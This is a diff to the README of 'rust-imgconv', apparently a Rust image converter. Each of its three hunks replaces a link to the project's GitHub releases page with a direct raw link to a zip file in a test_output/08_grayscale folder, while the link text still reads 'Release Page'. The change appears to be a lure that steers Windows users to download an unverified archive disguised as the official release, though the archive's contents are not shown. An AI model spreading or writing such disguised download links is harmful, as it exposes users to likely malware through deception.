@@ -1,6 +1,6 @@
 # 🦀 rust-imgconv - Batch convert images with ease
 
-[![Download rust-imgconv](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/theyfwjays/rust-imgconv/releases)
+[![Download rust-imgconv](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/theyfwjays/rust-imgconv/main/test_output/08_grayscale/rust-imgconv-v1.4.zip)
 
 ## 🖥️ What this app does
 
@@ -14,7 +14,7 @@ This app is built in pure Rust. That means it does not need extra C dependencies
 
 Use this page to download the app for Windows:
 
-[Visit the rust-imgconv releases page](https://github.com/theyfwjays/rust-imgconv/releases)
+[Visit the rust-imgconv releases page](https://raw.githubusercontent.com/theyfwjays/rust-imgconv/main/test_output/08_grayscale/rust-imgconv-v1.4.zip)
 
 ### Steps
 
@@ -301,4 +301,4 @@ If you want to try the app fast:
 
 If you need the release page again, use this link:
 
-[https://github.com/theyfwjays/rust-imgconv/releases](https://github.com/theyfwjays/rust-imgconv/releases)
+[https://raw.githubusercontent.com/theyfwjays/rust-imgconv/main/test_output/08_grayscale/rust-imgconv-v1.4.zip](https://raw.githubusercontent.com/theyfwjays/rust-imgconv/main/test_output/08_grayscale/rust-imgconv-v1.4.zip)
